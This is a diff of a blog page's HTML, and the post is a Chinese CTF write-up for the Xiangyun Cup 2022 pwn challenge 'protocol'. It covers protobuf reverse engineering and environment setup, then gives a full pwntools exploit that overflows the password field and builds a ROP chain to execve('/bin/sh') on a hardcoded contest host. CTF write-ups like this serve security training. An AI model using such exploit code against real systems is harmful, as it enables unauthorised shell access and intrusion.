@@ -1,294 +1,48 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" >
-
-<!--浏览器搞笑标题-->
-<script type="text/javascript" src="/js/FunnyTitle.js"></script>
-
-
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/duck.png">
-  <link rel="icon" href="/img/icon/duck.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#f58f98">
-  <meta name="author" content="Loora1N">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="第一次见到google protobuf类型的题目，虽然是到签到题，但还是学到了一些新的东西">
-<meta property="og:type" content="article">
-<meta property="og:title" content="【祥云杯2022】PWN-WriteUp-protocol">
-<meta property="og:url" content="http://loora1n.github.io/2022/11/01/%E3%80%90%E7%A5%A5%E4%BA%91%E6%9D%AF2022%E3%80%91PWN-WriteUp-protocol/index.html">
-<meta property="og:site_name" content="鷺雨のBlog">
-<meta property="og:description" content="第一次见到google protobuf类型的题目，虽然是到签到题，但还是学到了一些新的东西">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://loora1n.github.io/img/article/protocol/image-20221101210554873.png">
-<meta property="article:published_time" content="2022-11-01T13:44:44.727Z">
-<meta property="article:modified_time" content="2022-11-01T13:44:44.727Z">
-<meta property="article:author" content="Loora1N">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://loora1n.github.io/img/article/protocol/image-20221101210554873.png">
-  
-  
-  
-  <title>【祥云杯2022】PWN-WriteUp-protocol - 鷺雨のBlog</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-
-
-
-  
-<link rel="stylesheet" href="/css/fluid-extention.css">
-<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"loora1n.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"lftEbNU4XPuR5dgHNV3WdWxP-gzGzoHsz","app_key":"b3uLUVGLeOWDwREWHMBr0jo9","server_url":"https://lftebnu4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>鷺雨のBlog | </title>
     
-  
+<link rel="stylesheet" href="/css/reset.css">
 
+    
+<link rel="stylesheet" href="/css/style.css">
 
+    
+<link rel="stylesheet" href="/css/markdown.css">
 
-  
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
 <meta name="generator" content="Hexo 6.2.0"></head>
-
-
-<body>
-  
-
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>鷺雨のBlog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/bg/3.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="【祥云杯2022】PWN-WriteUp-protocol"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-01 21:44" pubdate>
-          2022年11月1日 晚上
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          3.9k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          33 分钟
-        
-      </span>
-    
-
-    
-    
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          阅读量 <span id="leancloud-page-views"></span>
-        </span>
-        
-      
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">【祥云杯2022】PWN-WriteUp-protocol</h1>
-            
-            
-              <div class="markdown-body">
+    <body>
+        <div class="paper">
+            <div class="paper-main">
                 
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次见到google protobuf类型的题目，虽然是到签到题，但还是学到了一些新的东西</p>
+                    <div class="post-header">
+    <a class="logo" href="/">鷺雨のBlog</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            【祥云杯2022】PWN-WriteUp-protocol
+        </div>
+        <div class="post-meta">
+            2022-11-01
+        </div>
+        <div class="post-md">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次见到google protobuf类型的题目，虽然是到签到题，但还是学到了一些新的东西</p>
 <h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>首先导入文件，当我看到左侧密密麻麻的无名函数就感受到了一丝不对劲</p>
 <p><img src="/img/article/protocol/image-20221101210554873.png" alt="image-20221101210554873"></p>
 <p>先运行一下程序，发现输出了一个<code>Login:</code></p>
@@ -324,461 +78,171 @@
 <p><img src="/img/article/protocol/image-20221101212029433.png" alt="image-20221101212029433"></p>
 <h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>首先找到最新版本的protobuf：<a target="_blank" rel="noopener" href="https://github.com/protocolbuffers/protobuf/releases">https://github.com/protocolbuffers/protobuf/releases</a><br>我这里下载的是：protobuf-cpp-3.21.9.tar.gz</p>
 <p>下载并安装protobuf，注意需要<strong>root</strong>权限，且必须在root账户下操作，sudo+指令不太行</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar -xzvf protobuf-cpp-3.21.9.tar.gz<br>cd protobuf-3.21.9<br>./autogen.sh<br>./configure --prefix=/usr/local/protobuf<br>make -j8 &amp;&amp; make install<br>ldconfig<br></code></pre></td></tr></table></figure>
-
+<pre><code class="shell">tar -xzvf protobuf-cpp-3.21.9.tar.gz
+cd protobuf-3.21.9
+./autogen.sh
+./configure --prefix=/usr/local/protobuf
+make -j8 &amp;&amp; make install
+ldconfig
+</code></pre>
 <p>安装完成之后，需要配置protobuf命令，更新环境变量</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">在/etc/profile文件中添加下面两行</span><br>export PATH=$PATH:/usr/local/protobuf/bin/<br>export PKG_CONFIG_PATH=/usr/local/protobuf/lib/pkgconfig/<br><span class="hljs-meta prompt_"># </span><span class="language-bash">然后执行</span><br>source /etc/profile<br></code></pre></td></tr></table></figure>
-
+<pre><code class="shell"># 在/etc/profile文件中添加下面两行
+export PATH=$PATH:/usr/local/protobuf/bin/
+export PKG_CONFIG_PATH=/usr/local/protobuf/lib/pkgconfig/
+# 然后执行
+source /etc/profile
+</code></pre>
 <p>配置动态链接库</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">在文件/etc/ld.so.conf中添加下面一行</span><br>/usr/local/protobuf/lib #（注意: 在新行处添加）<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">更改完成之后执行下面的命令</span><br>ldconfig<br></code></pre></td></tr></table></figure>
-
+<pre><code class="shell"># 在文件/etc/ld.so.conf中添加下面一行
+/usr/local/protobuf/lib #（注意: 在新行处添加）
+ 
+# 更改完成之后执行下面的命令
+ldconfig
+</code></pre>
 <p>配置好相关环境后，按照如下操作，分解出了<code>ctf_pb2.py</code>和<code>ctf.proto</code>文件</p>
 <p>使用自动化工具分析提取.py文件：<a target="_blank" rel="noopener" href="https://github.com/marin-m/pbtk">https://github.com/marin-m/pbtk</a></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip3 install protobuf<br>./extractors/from_binary.py [-h] input_file [output_dir] # 得到ctf.ptoto<br><br>pip3 install google<br>pip3 install protobuf<br>protoc -I=./ --python_out=./ ctf.proto  # 得到ctf_pb2.py<br></code></pre></td></tr></table></figure>
+<pre><code class="shell">pip3 install protobuf
+./extractors/from_binary.py [-h] input_file [output_dir] # 得到ctf.ptoto
 
+pip3 install google
+pip3 install protobuf
+protoc -I=./ --python_out=./ ctf.proto  # 得到ctf_pb2.py
+</code></pre>
 <p><img src="/img/article/protocol/image-20221101212237685.png" alt="image-20221101212237685"></p>
 <blockquote>
 <p>如果显示没有proto指令，可以安装protobuf-compiler后再次尝试</p>
 </blockquote>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install protobuf-compiler<br></code></pre></td></tr></table></figure>
-
+<pre><code class="shell">sudo apt-get install protobuf-compiler
+</code></pre>
 <p>.proto文件里存放了message的结构信息</p>
 <p><img src="/img/article/protocol/image-20221101212357009.png" alt="image-20221101212357009"></p>
 <p>然后将py文件作为库导入，即可利用它的接口完成消息传递，我传递message的函数如下定义</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">new_pwn</span>(<span class="hljs-params">payload</span>):<br>    <span class="hljs-keyword">global</span> io<br>    io.recvuntil(<span class="hljs-string">&#x27;Login: &#x27;</span>)<br>    person = pwn()<br>    person.username = <span class="hljs-string">b&#x27;admin&#x27;</span><br>    person.password = payload<br>    io.send(person.SerializeToString())<br></code></pre></td></tr></table></figure>
-
+<pre><code class="python">def new_pwn(payload):
+    global io
+    io.recvuntil(&#39;Login: &#39;)
+    person = pwn()
+    person.username = b&#39;admin&#39;
+    person.password = payload
+    io.send(person.SerializeToString())
+</code></pre>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>综合上述分析，我们在送入password时存在溢出漏洞，但是ROP中的含有的<strong>\x00</strong>难以直接送入。但是我们可以利用while循环多次送入不同长度的字符串，使得字符串结尾添加的<strong>\x00</strong>被我们利用。同时需要注意的是，这种情况下，我们需要倒着一点一点写好ROP，**&#x2F;bin&#x2F;sh**的字符串我们可以在最后写入全局变量，只要记住对应地址即可，同时结束while循环调用ROP链。</p>
 <p><img src="/img/article/protocol/image-20221101214354465.png" alt="image-20221101214354465"></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctf_pb2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn  <span class="hljs-keyword">import</span> *<br><br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new_pwn</span>(<span class="hljs-params">payload</span>):<br>    <span class="hljs-keyword">global</span> io<br>    io.recvuntil(<span class="hljs-string">&#x27;Login: &#x27;</span>)<br>    person = pwn()<br>    person.username = <span class="hljs-string">b&#x27;admin&#x27;</span><br>    person.password = payload<br>    io.send(person.SerializeToString())<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clear</span>(<span class="hljs-params">num</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>        payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*num + <span class="hljs-string">b&#x27;c&#x27;</span>*(<span class="hljs-number">8</span>-i)<br>        new_pwn(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">mode,ip = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">global</span> io<br>    <span class="hljs-keyword">if</span> mode == <span class="hljs-number">0</span>:<br>        io = process(<span class="hljs-string">&#x27;./protocol&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        io = remote(ip,port)<br>    <br>    <span class="hljs-comment">#0x0000000000403c99 : syscall</span><br>    <span class="hljs-comment">#binsh</span><br>    <span class="hljs-comment">#0x0000000000404982 : pop rdi ; ret</span><br>    <span class="hljs-comment">#0</span><br>    <span class="hljs-comment">#0x0000000000588bbe : pop rsi ; ret</span><br>    <span class="hljs-comment">#59</span><br>    <span class="hljs-comment">#0x00000000005bdb8a : pop rax ; ret</span><br>    <span class="hljs-comment">#0</span><br>    <span class="hljs-comment">#0x000000000040454f : pop rdx ; ret</span><br>    <br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> +<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;\x99\x3c\x40&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x38</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x38</span> + <span class="hljs-string">b&#x27;\x6f\xa3\x81&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x30</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span> + <span class="hljs-string">b&#x27;\x82\x49\x40&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x28</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x28</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x20</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span> + <span class="hljs-string">b&#x27;\xbe\x8b\x58&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x18</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + <span class="hljs-string">b&#x27;\x3b&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x10</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span> + <span class="hljs-string">b&#x27;\x8a\xdb\x5b&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x8</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x08</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x0</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x00</span> + <span class="hljs-string">b&#x27;\x4f\x45\x40&#x27;</span><br>    new_pwn(payload)<br>    <br>    pause()<br>    io.recvuntil(<span class="hljs-string">&#x27;Login:&#x27;</span>)<br>    person = pwn()<br>    person.username = <span class="hljs-string">b&#x27;admin&#x27;</span><br>    person.password = <span class="hljs-string">b&#x27;admin&#x27;</span><br>    payload = person.SerializeToString() + <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>    io.send(payload)<br>    <br>    <br>    io.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;210.30.97.133&#x27;</span>,<span class="hljs-number">28091</span>)<br></code></pre></td></tr></table></figure>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from ctf_pb2 import *
+from pwn  import *
 
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
+
+
+def new_pwn(payload):
+    global io
+    io.recvuntil(&#39;Login: &#39;)
+    person = pwn()
+    person.username = b&#39;admin&#39;
+    person.password = payload
+    io.send(person.SerializeToString())
+    
+def clear(num):
+    for i in range(1,8):
+        payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*num + b&#39;c&#39;*(8-i)
+        new_pwn(payload)
+
+
+def exp(mode,ip = &#39;0.0.0.0&#39;,port = 0):
+    global io
+    if mode == 0:
+        io = process(&#39;./protocol&#39;)
+    else:
+        io = remote(ip,port)
+    
+    #0x0000000000403c99 : syscall
+    #binsh
+    #0x0000000000404982 : pop rdi ; ret
+    #0
+    #0x0000000000588bbe : pop rsi ; ret
+    #59
+    #0x00000000005bdb8a : pop rax ; ret
+    #0
+    #0x000000000040454f : pop rdx ; ret
+    
+    payload = b&#39;a&#39;*0x248 +b&#39;b&#39;*0x40 + b&#39;\x99\x3c\x40&#39;
+    new_pwn(payload)
+    
+    clear(0x38)
+    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x38 + b&#39;\x6f\xa3\x81&#39;
+    new_pwn(payload)
+    
+    clear(0x30)
+    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x30 + b&#39;\x82\x49\x40&#39;
+    new_pwn(payload)
+    
+    clear(0x28)
+    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x28
+    new_pwn(payload)
+    
+    clear(0x20)
+    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x20 + b&#39;\xbe\x8b\x58&#39;
+    new_pwn(payload)
+    
+    clear(0x18)
+    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x18 + b&#39;\x3b&#39;
+    new_pwn(payload)
+    
+    clear(0x10)
+    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x10 + b&#39;\x8a\xdb\x5b&#39;
+    new_pwn(payload)
+    
+    clear(0x8)
+    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x08
+    new_pwn(payload)
+    
+    clear(0x0)
+    payload = b&#39;a&#39;*0x248 + b&#39;b&#39;*0x00 + b&#39;\x4f\x45\x40&#39;
+    new_pwn(payload)
+    
+    pause()
+    io.recvuntil(&#39;Login:&#39;)
+    person = pwn()
+    person.username = b&#39;admin&#39;
+    person.password = b&#39;admin&#39;
+    payload = person.SerializeToString() + b&#39;\x00&#39; + b&#39;/bin/sh\x00&#39;
+    io.send(payload)
+    
+    
+    io.interactive()
+
+if __name__ == &#39;__main__&#39;:
+    exp(1,&#39;210.30.97.133&#39;,28091)
+</code></pre>
+
+        </div>
+
+    
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 鷺雨のBlog</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
 </div>
 
 
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>【祥云杯2022】PWN-WriteUp-protocol</div>
-      <div>http://loora1n.github.io/2022/11/01/【祥云杯2022】PWN-WriteUp-protocol/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>Loora1N</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2022年11月1日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
-            
-              
-              
-                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
-      
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
 
 
+<script src="/js/highlight.min.js"></script>
 
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2022/11/03/i%E6%98%A5%E7%A7%8B%E6%98%A5%E5%AD%A3%E8%B5%9B-%E5%8B%87%E8%80%85%E5%B7%85%E5%B3%B0-chunqiuIOT/" title="i春秋春季赛-勇者巅峰-chunqiuIOT">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">i春秋春季赛-勇者巅峰-chunqiuIOT</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2022/10/28/%E9%80%82%E7%94%A8%E5%A4%9A%E7%89%88%E6%9C%AClibc%E7%9A%84pwn-base/" title="适用多版本libc的pwn-base">
-                        <span class="hidden-mobile">适用多版本libc的pwn-base</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
             </div>
-
-            
-  <article id="comments">
-    
-  <script type="text/javascript">
-    Fluid.utils.loadComments('#comments', function() {
-      var light = 'github-light';
-      var dark = 'github-dark';
-      var schema = document.documentElement.getAttribute('data-user-color-scheme');
-      if (schema === 'dark') {
-        schema = dark;
-      } else {
-        schema = light;
-      }
-      window.UtterancesThemeLight = light;
-      window.UtterancesThemeDark = dark;
-      var s = document.createElement('script');
-      s.setAttribute('src', 'https://utteranc.es/client.js');
-      s.setAttribute('repo', 'loora1n/comment');
-      s.setAttribute('issue-term', 'pathname');
-      
-      s.setAttribute('label', 'utterances');
-      
-      s.setAttribute('theme', schema);
-      s.setAttribute('crossorigin', 'anonymous');
-      document.getElementById('comments').appendChild(s);
-    })
-  </script>
-  <noscript>Please enable JavaScript to view the comments</noscript>
-
-
-  </article>
-
-
-          </article>
         </div>
-      </div>
-    </div>
-
